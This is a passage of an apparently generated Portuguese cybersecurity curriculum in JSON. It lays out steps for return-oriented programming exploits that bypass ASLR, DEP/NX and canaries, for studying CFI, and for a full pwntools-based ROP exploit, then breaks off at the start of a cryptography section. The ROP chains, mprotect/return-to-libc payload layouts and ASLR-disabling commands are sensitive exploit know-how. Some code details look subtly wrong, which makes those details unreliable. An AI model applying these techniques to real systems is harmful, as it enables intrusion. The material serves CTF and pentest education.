                              "realWorldApplication": "Em pentests e CTFs, otimizar ROP chains permite bypassar filtros WAF/IDS com payloads menores, aumentando stealth em exploits reais como em bug bounties (ex: ROP para RCE em serviços web vulneráveis a buffer overflows)."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.6.3",
                        "name": "Bypass de Proteções de Memória com ROP",
                        "description": "Adaptação de ROP para contornar mecanismos como ASLR, DEP/NX e canários, integrando com análise de binários e integridade de controle de fluxo.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.6.3.1",
                            "name": "Burlar ASLR em ataques ROP",
                            "description": "Utilizar vazamentos de informação ou gadgets de leitura parcial para descobrir endereços aleatorizados, combinando com ROP chains dinâmicas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender ASLR e Métodos de Vazamento de Informação",
                                  "subSteps": [
                                    "Estude o funcionamento do ASLR: randomização de base addresses para stack, heap, bibliotecas e PIE.",
                                    "Analise binários vulneráveis com ferramentas como checksec para confirmar ASLR ativado.",
                                    "Identifique primitivas de vazamento comuns: format strings, off-by-one overflows ou funções como gets/puts.",
                                    "Pratique leitura de memória parcial usando gadgets ROP básicos para leakar bytes de endereços.",
                                    "Documente offsets fixos entre gadgets e funções conhecidas em libc."
                                  ],
                                  "verification": "Execute um programa de teste e confirme leak de pelo menos um endereço aleatorizado via gdb ou pwndbg.",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "Binário vulnerável com ASLR (ex: de ROP Emporium)",
                                    "GDB/Pwndbg",
                                    "Libc local",
                                    "Checksec"
                                  ],
                                  "tips": "Use 'set disable-randomization off' no GDB apenas para depuração inicial; foque em leaks sem desabilitar ASLR.",
                                  "learningObjective": "Entender como ASLR protege e identificar vetores para vazamento de endereços.",
                                  "commonMistakes": [
                                    "Ignorar randomização PIE vs full ASLR",
                                    "Confundir leaks parciais com overwrites completos",
                                    "Não alinhar stack corretamente para gadgets de leak"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Desenvolver Primitiva de Leitura Parcial com Gadgets ROP",
                                  "subSteps": [
                                    "Gere ROP gadgets usando ROPgadget ou ropper em um binário ou libc.",
                                    "Construa uma chain ROP para leakar endereço da libc: pop gadget para ponteiro + call puts/read.",
                                    "Implemente leak parcial lidando com entropia ASLR (ex: leakar 12 bytes de 48-bit ASLR).",
                                    "Parse o leak em script Python para calcular base address da libc.",
                                    "Teste iterativamente ajustando padding e alinhamentos."
                                  ],
                                  "verification": "Script Python recebe leak e computa corretamente base da libc, validado contra 'ldd' ou gdb info proc mappings.",
                                  "estimatedTime": "3 hours",
                                  "materials": [
                                    "ROPgadget",
                                    "Pwntools Python library",
                                    "Binário com ROP vuln",
                                    "Libc.so debug symbols"
                                  ],
                                  "tips": "Procure gadgets como 'pop rdi; ret' para controlar argumentos de puts; use pwntools ROP chain builder.",
                                  "learningObjective": "Construir chains ROP que leakam endereços aleatorizados de forma confiável.",
                                  "commonMistakes": [
                                    "Gadgets inválidos devido a W^X",
                                    "Misalignment de stack (off-by-8)",
                                    "Não lidar com null bytes em leaks"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Construir ROP Chain Dinâmica Pós-Leak",
                                  "subSteps": [
                                    "Após leak, calcule endereços de funções/gadgets na libc (ex: system, /bin/sh).",
                                    "Monte chain ROP dinâmica: leak -> pivot stack -> exec system.",
                                    "Integre em exploit completo: primeiro stage leak, segundo stage ROP payload.",
                                    "Use pwntools para automação: receive leak, compute offsets, send payload.",
                                    "Adicione handling de falhas como timeouts ou multiple leaks."
                                  ],
                                  "verification": "Exploit roda remotamente, bypassa ASLR e spawna shell sem crashes.",
                                  "estimatedTime": "4 hours",
                                  "materials": [
                                    "Pwntools",
                                    "Servidor de teste (ex: Docker com ASLR)",
                                    "Libc database como libc.rip"
                                  ],
                                  "tips": "Cache offsets comuns da libc; teste com ASLR full randomization via 'setarch -R'.",
                                  "learningObjective": "Combinar leaks estáticos com chains ROP dinâmicas para bypass completo.",
                                  "commonMistakes": [
                                    "Cálculo errado de offsets (ex: +0xdeadbeef)",
                                    "Stack pivot falho",
                                    "Não considerar partial overwrites"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar, Refinar e Analisar o Bypass",
                                  "subSteps": [
                                    "Execute exploit em ambiente realista (remoto, ASLR+NX+Canary se possível).",
                                    "Monitore com gdbserver ou strace para debugar falhas.",
                                    "Meça taxa de sucesso (deve ser >90% com leaks precisos).",
                                    "Analise mitigações adicionais como stack canaries e refine leak para bypass delas.",
                                    "Documente o exploit completo em relatório com código fonte."
                                  ],
                                  "verification": "Exploit consistente ganha shell em 10+ runs consecutivos em ASLR ativado.",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "Netcat para listener",
                                    "GDB multiarch",
                                    "Relatório template"
                                  ],
                                  "tips": "Use 'ulimit -s unlimited' para grandes stacks; randomize runs com novos processos.",
                                  "learningObjective": "Refinar exploits para robustez contra proteções reais de memória.",
                                  "commonMistakes": [
                                    "Testar só local sem ASLR",
                                    "Ignorar endianness em leaks",
                                    "Over-reliance em symbols sem leak"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um desafio CTF com binário 'vuln' (ASLR+NX), use format string para leakar got entry de puts, calcule libc base, então ROP chain com system('/bin/sh') via pwntools: leak stage envia '%p %p...', recebe, computa offsets, envia payload dinâmico resultando em shell.",
                              "finalVerifications": [
                                "Exploit bypassa ASLR consistentemente em execuções remotas.",
                                "Script parseia leaks e constrói ROP chain sem erros manuais.",
                                "Gadgets selecionados são estáveis e não crasham.",
                                "Relatório explica cada offset e primitiva usada.",
                                "Taxa de sucesso >95% em 20 runs.",
                                "Integração com mitigações como PIE funciona."
                              ],
                              "assessmentCriteria": [
                                "Precisão no leak de endereços ASLR (erro <12 bits).",
                                "Chain ROP dinâmica executa sem stack corruption.",
                                "Automação completa via script (não manual).",
                                "Análise de falhas e mitigações adicionais.",
                                "Código limpo, comentado e reproduzível.",
                                "Demonstração em vídeo ou log de shell ganha."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: Entender layouts de memória e gadgets.",
                                "Sistemas Operacionais: Mecanismos de randomização e proteções mmap.",
                                "Engenharia Reversa: Uso de ROPgadget e análise binária.",
                                "Criptografia: Entropia em ASLR e ataques side-channel semelhantes.",
                                "Ética em Cibersegurança: Discussão de uso responsável em pentests."
                              ],
                              "realWorldApplication": "Em pentests profissionais ou CTFs, esse conhecimento permite avaliar eficácia de ASLR em aplicações reais, desenvolvendo defesas como RELRO full ou CFI; usado por pesquisadores para demonstrar vulnerabilidades em software legado como browsers ou servers."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.6.3.2",
                            "name": "Implementar ROP contra DEP/NX",
                            "description": "Construir chains que alterem permissões de memória (mprotect) ou usem ROP para execução return-to-libc, evitando execução direta de shellcode.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Ambiente de Teste e Analisar Binário Vulnerável",
                                  "subSteps": [
                                    "Compile um binário C vulnerável a buffer overflow sem proteções (desabilitar ASLR, DEP/NX via flags como -fno-stack-protector -z execstack temporariamente para baseline)",
                                    "Use gdb-peda ou gef para inspecionar o binário e confirmar DEP/NX ativo (verifique /proc/<pid>/maps para NX flags)",
                                    "Identifique endereço de libc e funções como mprotect ou system via ldd e gdb",
                                    "Desabilite ASLR temporariamente com echo 0 > /proc/sys/kernel/randomize_va_space",
                                    "Crie um script Python com pwntools para gerar payloads iniciais"
                                  ],
                                  "verification": "Execute o binário em gdb e confirme overflow básico sem ROP funciona, mas falha com DEP/NX ativado",
                                  "estimatedTime": "1 hour",
                                  "materials": [
                                    "Binário vulnerável (ex: vuln.c)",
                                    "gdb com peda/gef",
                                    "pwntools (pip install pwntools)",
                                    "ROPgadget tool"
                                  ],
                                  "tips": "Use checksec.sh para verificar proteções no binário",
                                  "learningObjective": "Preparar um ambiente controlado para testar bypass de DEP/NX via ROP",
                                  "commonMistakes": [
                                    "Esquecer de desabilitar ASLR inicialmente",
                                    "Não confirmar status NX via maps",
                                    "Usar binário com proteções parciais"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Localizar Gadgets ROP e Funções Necessárias",
                                  "subSteps": [
                                    "Execute ROPgadget --binary vuln para listar gadgets como pop rdi; ret, pop rsi; ret, etc.",
                                    "Em gdb, encontre endereço de mprotect em libc (p mprotect) e parâmetros: addr, len, PROT_READ|PROT_WRITE|PROT_EXEC",
                                    "Localize endereço de uma página shellcode (alocar com mmap em payload)",
                                    "Para alternativa, encontre system() e /bin/sh em libc (__libc_start_main+offset para sh)",
                                    "Salve gadgets e endereços em variáveis Python para chain"
                                  ],
                                  "verification": "Liste pelo menos 5 gadgets úteis e confirme endereços de mprotect/system com pwndbg 'vmmap' e 'info proc mappings'",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "ROPgadget",
                                    "gdb-pwndbg",
                                    "cyclic pattern generator (cyclic 100)"
                                  ],
                                  "tips": "Filtre gadgets com ROPgadget --string 'mprotect' ou use ropper para visualização",
                                  "learningObjective": "Identificar primitivas ROP para controle de registradores e chamadas de funções",
                                  "commonMistakes": [
                                    "Gadgets de seção errada (NX)",
                                    "Endereços incorretos de libc devido a ASLR",
                                    "Ignorar alinhamento de stack"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Construir ROP Chain para mprotect e Permitir Execução de Shellcode",
                                  "subSteps": [
                                    "No script pwntools, defina shellcode (ex: execve /bin/sh) e aloque página com mmap (addr fixo)",
                                    "Construa chain: pop rdi (addr_shellcode); pop rsi (0x1000); pop rdx (7 para RWX); mprotect; ret; shellcode",
                                    "Preencha buffer overflow com padding + chain endereços (little-endian, p64())",
                                    "Adicione NOP sled ou alinhamento para ROP pivot",
                                    "Teste payload: p.sendline(payload); p.interactive()"
                                  ],
                                  "verification": "Execute e confirme mprotect muda permissões (gdb: vmmap mostra RWX na página), shellcode roda",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "pwntools script",
                                    "shellcode de msfvenom ou manual (\\x31\\xc0...)"
                                  ],
                                  "tips": "Use context.log_level='debug' em pwntools para ver bytes enviados",
                                  "learningObjective": "Montar chain ROP que invoca mprotect para bypass DEP/NX",
                                  "commonMistakes": [
                                    "Parâmetros errados para mprotect (len deve ser page-aligned 0x1000)",
                                    "Stack não alinhado (add 8 bytes)",
                                    "Shellcode em região não mapeável"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar Alternativa Return-to-libc com ROP e Verificar Bypass",
                                  "subSteps": [
                                    "Localize system() e /bin/sh em libc",
                                    "Chain ROP: pop rdi (addr_binsh); system(); ret",
                                    "Gere payload com padding + chain",
                                    "Execute remotamente ou localmente, capture shell",
                                    "Re-habilite ASLR/DEP e use leak de libc base via outro overflow para chain dinâmica"
                                  ],
                                  "verification": "Obtenha shell interativa sem crash, confirme com whoami ou id",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "Libc local ou libc-database para leaks",
                                    "Netcat para remote test"
                                  ],
                                  "tips": "Para leaks, primeiro ROP chain para printf(leak canary/pie)",
                                  "learningObjective": "Aplicar ROP para execução indireta de código via libc, sem shellcode",
                                  "commonMistakes": [
                                    "Endereço /bin/sh NULL ou inválido",
                                    "Falta de exit() após system",
                                    "Não tratar PIE"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar Robustez e Mitigações Adicionais",
                                  "subSteps": [
                                    "Recompile com ASLR/DEP full, implemente leak de libc base via ROP inicial",
                                    "Teste contra Canary (bypass com leak)",
                                    "Compare performance de mprotect vs return-to-libc",
                                    "Documente chain em relatório com hexdump",
                                    "Experimente em CTF challenge similar (ex: ROP Emporium)"
                                  ],
                                  "verification": "Exploit funciona consistentemente em 5 runs com ASLR on",
                                  "estimatedTime": "1 hour",
                                  "materials": [
                                    "CTF binaries (ROP Emporium)",
                                    "checksec para validação"
                                  ],
                                  "tips": "Use one_gadget para ROP mais limpas",
                                  "learningObjective": "Refinar ROP chains contra defesas reais",
                                  "commonMistakes": [
                                    "Leaks imprecisos (off-by-one)",
                                    "Não testar multi-arquitetura (x86/x64)"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário vuln com buffer overflow de 112 bytes, chain ROP: [pop_rdi; 0x7fff0000 (mmap addr); pop_rsi; 0x1000; pop_rdx; 7; mprotect_addr; shellcode]. Payload: b'A'*112 + chain + shellcode. Resultado: shell(/bin/sh) sem DEP violação.",
                              "finalVerifications": [
                                "Exploit obtém shell em binário com DEP/NX ativado",
                                "mprotect muda permissões para RWX confirmada via gdb vmmap",
                                "Return-to-libc chain executa system sem shellcode",
                                "Funciona com ASLR parcial via leak manual",
                                "Nenhum crash ou segfault em execuções repetidas",
                                "Relatório documenta todos endereços e bytes"
                              ],
                              "assessmentCriteria": [
                                "Precisão na construção da ROP chain (sem offsets errados)",
                                "Sucesso no bypass de DEP/NX em ambiente protegido",
                                "Uso correto de ferramentas (ROPgadget, pwntools)",
                                "Explicação clara de primitivas e parâmetros",
                                "Robustez contra variações (ASLR, canary)",
                                "Documentação completa com screenshots de gdb"
                              ],
                              "crossCurricularConnections": [
                                "Assembly x86/x64: Entender gadgets e registradores",
                                "Sistemas Operacionais: Gerenciamento de memória e syscalls",
                                "Programação em C/Python: Buffer overflows e scripting exploits",
                                "Redes: Testes remotos via pwntools remote()",
                                "Ética em Cibersegurança: Uso responsável em pentests"
                              ],
                              "realWorldApplication": "Em pentests/red teaming, ROP bypassa DEP/NX em exploits reais como EternalBlue variantes ou custom malware; essencial para análise de vulnerabilidades em software legado sem patches."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.6.3.3",
                            "name": "Analisar defesas contra ROP (CFI)",
                            "description": "Estudar Controle de Fluxo de Integridade (CFI) e como ROP avança para JOP/COP, identificando limitações em proteções modernas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Fundamentos de ROP e Introdução ao CFI",
                                  "subSteps": [
                                    "Revise o conceito de ROP (Return-Oriented Programming) e como ele explora overflows de buffer para redirecionar o fluxo de controle.",
                                    "Estude o que é Control Flow Integrity (CFI) e seus objetivos principais em prevenir violações de fluxo de controle.",
                                    "Analise exemplos básicos de gadgets ROP e como CFI os detecta via verificação de ponteiros de retorno.",
                                    "Compare ROP tradicional com proteções como ASLR e DEP, destacando por que CFI é necessário.",
                                    "Identifique componentes chave do CFI: grafo de fluxo de controle (CFG) e verificações em runtime."
                                  ],
                                  "verification": "Explique em suas palavras como CFI usa CFG para validar saltos de retorno, com um diagrama simples.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Documentação LLVM CFI",
                                    "Artigos acadêmicos sobre ROP (ex: 'Return-Oriented Rootkits')",
                                    "Ferramenta GDB para depuração"
                                  ],
                                  "tips": "Use diagramas para visualizar o CFG; foque em exemplos reais de exploits ROP como em CTFs.",
                                  "learningObjective": "Entender os princípios básicos de ROP e como CFI é projetado para mitigá-lo.",
                                  "commonMistakes": "Confundir CFI com canaries de stack; ignorar que CFI é mais amplo que apenas retornos."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Mecanismos Detalhados de CFI",
                                  "subSteps": [
                                    "Implemente ou simule CFI forward-edge (chamadas de função) e backward-edge (retornos) usando ferramentas como Clang com -fsanitize=cfi.",
                                    "Estude variantes de CFI: coarse-grained vs fine-grained, e bin-CFI para binários legados.",
                                    "Teste CFI em um programa vulnerável a ROP, compilando com flags CFI e tentando um exploit.",
                                    "Analise o overhead de performance do CFI e otimizações como shadow stacks.",
                                    "Revise papers como 'Control-Flow Integrity' de Abadi et al. para profundidade teórica."
                                  ],
                                  "verification": "Compile um binário com CFI ativado, execute um payload ROP e confirme que falha com segment fault ou abort.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Compilador Clang/LLVM",
                                    "Exemplos de código ROP no GitHub (ex: ROPgadget)",
                                    "Paper original de CFI (ACM 2009)"
                                  ],
                                  "tips": "Comece com exemplos simples em C; use ROPgadget para encontrar gadgets mesmo com CFI.",
                                  "learningObjective": "Dominar como CFI enforce CFG em runtime e suas implementações práticas.",
                                  "commonMistakes": "Assumir que CFI protege contra todos os ataques de controle de fluxo; subestimar overhead em cenários reais."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Evolução de ROP para JOP e COP",
                                  "subSteps": [
                                    "Estude Just-In-Time ROP (JIT-ROP) e como ele evade CFI ao construir gadgets dinamicamente.",
                                    "Aprenda sobre Jump-Oriented Programming (JOP), usando tabelas de jump (JOP islands) em vez de retornos.",
                                    "Explore Counterfeit Object-oriented Programming (COOP), manipulando objetos OO para bypass CFI.",
                                    "Simule um ataque JOP em um binário protegido por CFI básico e observe falhas.",
                                    "Compare limitações: CFI forward protege JOP parcialmente, mas COOP explora tipagem."
                                  ],
                                  "verification": "Descreva um payload JOP simples e explique por que ele falha ou succeeds contra CFI padrão.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Ferramentas como JOPTool ou Q for ROP/JOP",
                                    "Papers: 'JOP: Practical Control Flow Hijacking' e 'COOP: Enabling Gadget Chains'"
                                  ],
                                  "tips": "Pratique em ambientes como ROP Emporium; foque em como JOP usa 'jmp *reg' para pular CFI de retornos.",
                                  "learningObjective": "Identificar como ataques evoluem além de ROP para contornar CFI.",
                                  "commonMistakes": "Ignorar que CFI fine-grained mitiga JOP melhor; confundir JOP com ROP sem tabelas de dispatch."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Identificar Limitações em Proteções Modernas de CFI",
                                  "subSteps": [
                                    "Analise limitações: imprecisão em CFG coarse-grained, ataques side-channel em verificações.",
                                    "Estude CFI avançado como C/CFI, TypeArmor e suas fraquezas contra ataques info-leak.",
                                    "Teste bypasses reais, como em papers recentes (ex: BROP para leaks com CFI).",
                                    "Discuta integrações com outras proteções: CFI + PAC (Pointer Authentication).",
                                    "Sintetize: quando CFI falha e recomendações para hardening (ex: fine-grained + hardware)."
                                  ],
                                  "verification": "Liste 3 limitações específicas de CFI moderno com exemplos de exploits conhecidos.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Papers recentes: 'kCFI: Mitigating Type Confusion' e 'All Your CFG Ain't Belong to You'",
                                    "Exploit-DB entradas ROP/CFI"
                                  ],
                                  "tips": "Leia resumos de BlackHat/DEF CON talks sobre CFI bypasses para contexto atual.",
                                  "learningObjective": "Criticar efetividade de CFI contra evoluções de ROP e propor melhorias.",
                                  "commonMistakes": "Superestimar CFI como silver bullet; ignorar custos de deployment em produção."
                                }
                              ],
                              "practicalExample": "Em um desafio CTF, você tem um binário com buffer overflow protegido por CFI básico. Construa um payload ROP inicial que falha. Evolua para JOP usando uma tabela de jumps encontrada via ROPgadget, observe o bypass parcial, e analise por que COOP seria necessário para primitivas de dados, finalmente propondo um CFI fine-grained como defesa.",
                              "finalVerifications": [
                                "Explicar com precisão como CFI valida backward-edges e falha em JOP.",
                                "Simular e demonstrar um bypass JOP em código protegido por CFI.",
                                "Listar pelo menos 3 limitações modernas de CFI com referências.",
                                "Diferenciar ROP, JOP e COOP em termos de evasão de CFI.",
                                "Propor uma stack de proteções (CFI + ASLR + PAC) para mitigar.",
                                "Analisar overhead de CFI em benchmarks simples."
                              ],
                              "assessmentCriteria": [
                                "Profundidade na explicação de mecanismos CFI (forward/backward).",
                                "Precisão na identificação de bypasses (JOP/COOP exemplos funcionais).",
                                "Análise crítica de limitações com evidências de papers/exploits.",
                                "Criatividade em exemplos práticos e verificações.",
                                "Clareza em conexões com proteções modernas.",
                                "Demonstração prática via código ou simulação."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Entendimento de stack, registers e fluxo de controle em assembly.",
                                "Programação de Sistemas: Compilação segura com LLVM/Clang e hardening flags.",
                                "Análise de Malware: Identificação de ROP/JOP em amostras reais de exploits.",
                                "Engenharia de Software: Design de defesas proativas em desenvolvimento seguro.",
                                "Matemática Discreta: Grafos para modelagem de CFG."
                              ],
                              "realWorldApplication": "Em pentesting, analise binários de alvos para vulnerabilidades ROP/JOP e valide efetividade de CFI em firmwares IoT ou apps mobile; desenvolvedores usam para auditar código C/C++ contra exploits de memória em produção, como em navegadores ou sistemas operacionais."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.6.3.4",
                            "name": "Desenvolver exploit ROP completo",
                            "description": "Integrar análise de binários, gadgets e bypasses em um exploit funcional para buffer overflow, testando em ambiente vulnerável.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Ambiente de Teste e Analisar Binário Vulnerável",
                                  "subSteps": [
                                    "Instalar ferramentas essenciais: pwntools, gdb com extensões (gef/peda), ROPgadget, checksec.",
                                    "Baixar ou compilar binário vulnerável com buffer overflow (ex: sem proteções ou com NX ativado).",
                                    "Executar checksec para identificar proteções ativas (NX, ASLR, Canary, PIE).",
                                    "Usar gdb para analisar o binário: encontrar offset do buffer overflow via cyclic patterns (ex: gdb-peda cyclic).",
                                    "Mapear seções de memória: stack, heap, libc com 'ldd' e 'vmmap'."
                                  ],
                                  "verification": "Offset confirmado gera crash controlável no EIP/RIP; relatório de proteções gerado.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Binário vulnerável (ex: de picoCTF ou DVWA)",
                                    "pwntools",
                                    "gdb-peda/gef",
                                    "ROPgadget",
                                    "checksec"
                                  ],
                                  "tips": "Use Docker para isolar ambiente e evitar riscos; desative ASLR temporariamente com 'echo 0 > /proc/sys/kernel/randomize_va_space' para testes iniciais.",
                                  "learningObjective": "Entender o binário e suas vulnerabilidades para planejar ROP.",
                                  "commonMistakes": [
                                    "Ignorar proteções como Canary levando a falhas prematuras",
                                    "Não mapear corretamente endereços de libc",
                                    "Usar binários modernos com proteções fortes sem adaptação"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e Extrair Gadgets ROP",
                                  "subSteps": [
                                    "Executar ROPgadget no binário: 'ROPgadget --binary vuln --nosys --only \"pop|ret|call|mov\"' para filtrar gadgets úteis.",
                                    "Listar gadgets comuns: pop rdi; ret;, int 80h, etc., e salvá-los em arquivo.",
                                    "Verificar validade em gdb: setar breakpoint no overflow e stepar gadgets manualmente.",
                                    "Identificar endereços de funções libc: system(), /bin/sh via 'gdb --pid=proc' ou one_gadget.",
                                    "Documentar gadgets em uma tabela: gadget, opcode, uso pretendido."
                                  ],
                                  "verification": "Lista de 10+ gadgets válidos extraídos e testados em gdb sem crash.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "ROPgadget",
                                    "gdb",
                                    "one_gadget para gadgets libc",
                                    "Binário analisado"
                                  ],
                                  "tips": "Priorize gadgets curtos e chains simples; use 'ROPgadget --string /bin/sh' para encontrar strings úteis.",
                                  "learningObjective": "Dominar extração de primitives ROP para construção de chains.",
                                  "commonMistakes": [
                                    "Gadgets inválidos devido a NX (use ret2csu ou similares)",
                                    "Não alinhar stack (adicionar nop sleds ou ret gadgets)",
                                    "Confundir endianness em 64-bit"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Projetar e Construir a ROP Chain",
                                  "subSteps": [
                                    "Definir payload objetivo: ex: pop rdi -> addr(/bin/sh) -> system().",
                                    "Montar chain em Python com pwntools: ROP(elf).system(ROP.find_gadget(0xcafe).address).",
                                    "Calcular padding: offset + chain + alinhamento (8 bytes em x64).",
                                    "Testar chain parcial em gdb: 'r < payload' e verificar execução sequencial.",
                                    "Iterar chain para múltiplas chamadas se necessário (ex: read -> write -> execve)."
                                  ],
                                  "verification": "Chain executa sem crash em gdb, alcançando primeiro gadget corretamente.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "pwntools",
                                    "gdb",
                                    "Lista de gadgets do Step 2"
                                  ],
                                  "tips": "Use pwntools ROP class para automação; visualize chain com 'ROP.dump()'.",
                                  "learningObjective": "Construir sequências ROP funcionais para controle de fluxo arbitrário.",
                                  "commonMistakes": [
                                    "Stack desalinhado causando segfault",
                                    "Endereços errados de libc",
                                    "Overflow de buffer incompleto"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar Bypasses de Proteções",
                                  "subSteps": [
                                    "Bypass ASLR: leak stack/libc via format string ou info leak parcial.",
                                    "Bypass Canary: encontrar via brute-force ou leak antes do overflow.",
                                    "Bypass NX/DEP: chain ROP pura sem shellcode.",
                                    "Bypass PIE: calcular base do binário via leak de GOT.",
                                    "Integrar leaks na chain: primeiro leak, second stage ROP.",
                                    "Testar com proteções ativadas: 'setarch -R ./vuln' para full ASLR."
                                  ],
                                  "verification": "Exploit funciona com ASLR e NX ativados, obtendo shell estável.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "pwntools para leaks",
                                    "gdb com 'catch syscall'",
                                    "Binário com proteções parciais"
                                  ],
                                  "tips": "Use 'ret2csu' para argumentos múltiplos; one_gadget para chains curtas em libc.",
                                  "learningObjective": "Adaptar ROP para cenários reais com mitigações modernas.",
                                  "commonMistakes": [
                                    "Leaks imprecisos devido a ASLR parcial",
                                    "Canary leak sem reset",
                                    "Não lidar com FORTIFY_SOURCE"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Desenvolver Exploit Completo e Realizar Testes Finais",
                                  "subSteps": [
                                    "Escrever script Python completo: context.binary=elf, p=process/remote(), payload=padding+chain, p.sendline(payload).",
                                    "Adicionar interatividade: p.interactive() para shell.",
                                    "Testar localmente e remotamente (ex: servidor CTF).",
                                    "Debuggar falhas: usar gdbserver para attach remoto.",
                                    "Otimizar: tornar sigiloso, handle erros, multi-stage.",
                                    "Documentar exploit: código comentado, chain explicada."
                                  ],
                                  "verification": "Exploit obtém shell confiável em 10/10 runs com proteções ativas.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Script Python final",
                                    "Servidor de teste remoto",
                                    "pwntools full"
                                  ],
                                  "tips": "Use 'log.level = \"debug\"' para verbose; teste em VM para isolamento.",
                                  "learningObjective": "Integrar todos elementos em exploit funcional e robusto.",
                                  "commonMistakes": [
                                    "Hardcoded endereços quebrando com restarts",
                                    "Não handle timeouts remotos",
                                    "Falta de cleanup pós-shell"
                                  ]
                                }
                              ],
                              "practicalExample": "Para um binário 'vuln' com buffer overflow e NX ativado: use ROP para chain pop rdi; ret; (0xdeadbeef) -> system(0xdeadbeef) onde 0xdeadbeef é leak de /bin/sh e system de libc, obtendo shell interativa via pwntools.",
                              "finalVerifications": [
                                "Exploit executa ROP chain sem crashes em ambiente protegido.",
                                "Shell interativa é obtida consistentemente (sucesso >90%).",
                                "Bypasses funcionam com ASLR/PIE/NX ativados.",
                                "Código é modular e comentado para reutilização.",
                                "Testes remotos simulam cenários reais.",
                                "Nenhum vazamento de segredos no payload."
                              ],
                              "assessmentCriteria": [
                                "Precisão da análise inicial (offset e proteções corretos).",
                                "Qualidade e diversidade de gadgets selecionados.",
                                "Corretude lógica da ROP chain (alinhamento e ordem).",
                                "Eficácia dos bypasses em cenários reais.",
                                "Robustez do exploit (estabilidade, handling de erros).",
                                "Documentação clara e código limpo."
                              ],
                              "crossCurricularConnections": [
                                "Assembly x86/x64 para entender gadgets.",
                                "Estruturas de Dados (pilhas e chains).",
                                "Programação em Python (pwntools scripting).",
                                "Sistemas Operacionais (gerenciamento de memória Linux).",
                                "Debugging e Ferramentas de Reverse Engineering."
                              ],
                              "realWorldApplication": "Em pentests e bug bounties, desenvolver PoCs ROP demonstra severidade de buffer overflows, auxiliando em relatórios para mitigações como Control Flow Integrity (CFI) e stack canaries; essencial para red teamers simularem ataques avançados."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  }
                ]
              },
              {
                "id": "10.1.2",
                "name": "Criptografia",
                "description": "Aborda funções de números pseudoaleatórios, cifradores simétricos, funções hash e criptografia de chave pública.",
                "totalSkills": 42,
                "atomicTopics": [
                  {
                    "id": "10.1.2.1",
                    "name": "Funções de Números Pseudoaleatórios",
                    "description": "Geração e propriedades de sequências pseudoaleatórias para aplicações criptográficas, como chaves e nonces.",
                    "individualConcepts": [
                      {
                        "id": "10.1.2.1.1",
                        "name": "Definição e Fundamentos de Funções Pseudoaleatórias",
                        "description": "Compreensão dos conceitos básicos de números pseudoaleatórios (PRNG), incluindo a distinção entre aleatoriedade verdadeira e pseudoaleatoriedade, e o papel das sementes na geração determinística de sequências.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.1.1.1",
                            "name": "Diferenciar Aleatoriedade Verdadeira de Pseudoaleatoriedade",
                            "description": "Identificar e explicar as diferenças entre fontes de entropia verdadeira (como ruído térmico) e funções pseudoaleatórias determinísticas, destacando limitações como previsibilidade sem semente adequada.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Conceitos Fundamentais de Aleatoriedade Verdadeira",
                                  "subSteps": [
                                    "Defina aleatoriedade verdadeira como eventos imprevisíveis baseados em fenômenos físicos quânticos ou térmicos.",
                                    "Identifique fontes comuns de entropia verdadeira, como ruído térmico, decaimento radioativo ou ruído atmosférico.",
